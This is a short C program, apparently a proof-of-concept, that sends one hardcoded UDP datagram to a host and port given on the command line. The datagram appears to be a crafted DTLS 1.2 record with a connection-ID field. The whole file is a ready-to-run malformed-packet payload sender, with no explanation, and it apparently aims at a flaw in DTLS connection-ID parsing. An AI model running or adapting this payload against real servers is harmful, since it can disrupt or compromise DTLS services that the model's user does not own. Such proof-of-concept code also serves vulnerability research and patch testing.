/*
 * usage: main <host> <port>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUFSIZE 1024

const char buf[] = {
    0x17, 0xfe, 0xfd, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 

    /* CID */
    0x00, 0x00, 0x00, 0x01,

    0x00,
    0x3a, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x6f, 0xf2, 0x0e,
    0xd4, 0xce, 0x6e, 0x4b, 0x7f, 0xfa, 0xed, 0xd3, 0x54, 0xfe, 0xce, 0xaf,
    0x50, 0x67, 0xa6, 0x40, 0x9d, 0x60, 0x03, 0xb1, 0x63, 0xe7, 0xea, 0x7f,
    0x2c, 0xc4, 0x16, 0xa7, 0x24, 0x78, 0xef, 0x67, 0x48, 0xd0, 0xb0, 0x34,
    0x9a, 0xf4, 0x3e, 0x2c, 0x21, 0x35, 0x99, 0xf2, 0xbf, 0x3f, 0xc8};

/*
 * error - wrapper for perror
 */
void error(char *msg)
{
  perror(msg);
  exit(0);
}

int main(int argc, char **argv)
{
  int sockfd, portno, n;
  int serverlen;
  struct sockaddr_in serveraddr;
  struct hostent *server;
  char *hostname;

  /* check command line arguments */
  if (argc != 3) {
    fprintf(stderr, "usage: %s <hostname> <dst port>\n", argv[0]);
    exit(0);
  }
  hostname = argv[1];
  portno = atoi(argv[2]);

  /* socket: create the socket */
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) error("ERROR opening socket");

  /* gethostbyname: get the server's DNS entry */
  server = gethostbyname(hostname);
  if (server == NULL) {
    fprintf(stderr, "ERROR, no such host as %s\n", hostname);
    exit(0);
  }

  /* build the server's Internet address */
  bzero((char *)&serveraddr, sizeof(serveraddr));
  serveraddr.sin_family = AF_INET;
  bcopy((char *)server->h_addr, (char *)&serveraddr.sin_addr.s_addr,
        server->h_length);
  serveraddr.sin_port = htons(portno);

  /* send the message to the server */
  serverlen = sizeof(serveraddr);
  n = sendto(sockfd, buf, sizeof buf, 0, (const struct sockaddr *)&serveraddr,
             serverlen);
  if (n < 0) error("ERROR in sendto");

  printf("Payload sent\n");

  return 0;
}
